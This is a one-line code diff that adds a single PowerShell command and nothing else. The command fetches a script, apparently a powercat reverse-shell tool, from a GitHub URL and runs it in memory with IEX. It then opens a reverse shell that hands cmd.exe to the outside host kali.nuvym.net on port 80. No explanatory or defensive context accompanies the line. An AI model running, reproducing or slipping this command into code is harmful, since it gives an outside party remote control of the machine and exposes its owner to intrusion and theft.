@@ -1,0 +1,1 @@
+ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/rexpository/reverseshell-powercat-v2/main/powercat.ps1');powerrcatt -c kali.nuvym.net -p 80 -e cmd"
